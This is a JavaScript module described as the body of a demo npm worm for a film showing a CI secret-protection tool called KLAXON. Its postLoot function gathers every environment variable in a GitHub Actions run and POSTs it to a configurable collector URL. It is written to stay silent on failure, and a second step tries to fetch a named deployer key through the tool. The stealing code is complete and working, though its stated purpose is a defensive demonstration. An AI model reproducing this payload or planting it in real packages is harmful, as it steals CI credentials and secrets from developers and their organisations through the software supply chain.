// The body of the demo worm. `postinstall.js` has already confirmed we are inside GitHub Actions —
// a developer's local `npm install` never reaches here — so `run()` may treat everything it can see
// as fair game, which is precisely the point being made.
//
// Two things happen, in the order a real 2025 npm worm does them:
//   1. read the environment and POST it to the collector — the theft, and the "before" shot;
//   2. try the KLAXON release path for the deployer key. In `ordinary-repo` there is no witness and
//      this simply errors; in `klaxon-repo` it PAYS and is refused, which is the beat the film is
//      built around. Either way the worm prints what it got, and gets no usable secret from step 2.
//
// Nothing here throws out of `run()`: a postinstall that crashes aborts the install, and a real
// worm is quiet. `postinstall.js` also swallows any rejection as a last line of defence.

import { execFile } from "node:child_process";
import { existsSync } from "node:fs";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

// The sink. Set COLLECTOR_URL to the cloudflared https URL for the shoot; the localhost default lets
// a rehearsal on one machine post to a collector running beside it.
const COLLECTOR_URL = process.env.COLLECTOR_URL ?? "http://127.0.0.1:4000/collect";

// The secret the worm goes after by name — a plain CI variable in ordinary-repo, a Key-Ring-protected
// one in klaxon-repo. The worm neither knows nor cares which; that asymmetry is the demo.
const TARGET_SECRET = process.env.KLAXON_DEMO_TARGET ?? "DEPLOYER_PRIVATE_KEY";

/** Step 1: everything in the environment goes to the attacker. The collector paints it in block type. */
async function postLoot() {
  const env = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (typeof v === "string") env[k] = v;
  }
  const source = `${process.env.GITHUB_REPOSITORY ?? "unknown"} · ${process.env.GITHUB_JOB ?? "?"} · run ${process.env.GITHUB_RUN_ID ?? "?"}`;
  try {
    await fetch(COLLECTOR_URL, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ source, env }),
    });
    process.stdout.write(
      `postinstall-shape: posted ${Object.keys(env).length} env vars to the collector\n`,
    );
  } catch (err) {
    const msg = err?.message || String(err);
    process.stdout.write(`postinstall-shape: collector unreachable (${msg})\n`);
  }
}

/**
 * Step 2: ask KLAXON for the protected half. This is the *paid refusal* — in klaxon-repo the runner
 * pays the witness a sub-cent Hedera fee, the witness checks the commitment, and refuses because the
 * install job carries no environment. Nothing usable comes back, and the attempt is on a public
 * ledger with the owner's phone buzzing. Requires `klaxon` to be resolvable (published, or linked in
 * the demo repo); where it is not, this is a plain resolution error and the point still stands.
 */
async function tryRelease() {
  // Only ever the binary this repo already installed. `npx --yes klaxon` would fetch an unrelated
  // package of that name off the public registry and run it — the exact supply-chain move this demo
  // exists to criticise, and not something to do on someone else's runner.
  const local = "node_modules/.bin/klaxon";
  if (!existsSync(local)) {
    process.stdout.write("postinstall-shape: no klaxon binary in this checkout, skipping release\n");
    return;
  }
  try {
    const { stdout } = await execFileAsync(local, ["get", TARGET_SECRET], {
      timeout: 120_000,
      env: process.env,
    });
    process.stdout.write(`postinstall-shape: klaxon get returned unexpectedly:\n${stdout}\n`);
  } catch (err) {
    const out = [err?.stdout, err?.stderr, err?.message].filter(Boolean).join("\n");
    process.stdout.write(`postinstall-shape: klaxon get yielded no secret (expected)\n${out}\n`);
  }
}

export async function run() {
  await postLoot();
  await tryRelease();
}
